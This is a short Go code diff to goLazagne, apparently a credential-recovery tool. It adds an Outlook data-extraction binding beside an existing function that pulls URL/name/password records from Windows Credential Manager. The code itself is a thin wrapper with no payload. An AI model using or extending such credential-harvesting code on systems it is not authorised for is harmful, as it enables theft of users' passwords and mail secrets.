@@ -4,6 +4,7 @@ import (
 	"github.com/kerbyj/goLazagne/browsers"
 	"github.com/kerbyj/goLazagne/common"
 	"github.com/kerbyj/goLazagne/filesystem"
+	outlook "github.com/kerbyj/goLazagne/mail"
 	"github.com/kerbyj/goLazagne/sysadmin"
 	"github.com/kerbyj/goLazagne/types"
 	"github.com/kerbyj/goLazagne/wifi"
@@ -66,6 +67,17 @@ func ExtractCredmanData() ([]common.UrlNamePass, int) {
 		return windowsResult.Data, len(windowsResult.Data)
 	}
 	return nil, 0
+}
+
+//Temp binding for outlook data retrieval
+func ExtractOutlookData() ([]outlook.ExtractedData, error){
+	outlookData, errExtractOutlookData := outlook.OutlookRun()
+
+	if errExtractOutlookData != nil {
+		return nil, errExtractOutlookData
+	}
+
+	return outlookData, nil
 }
 
 /*
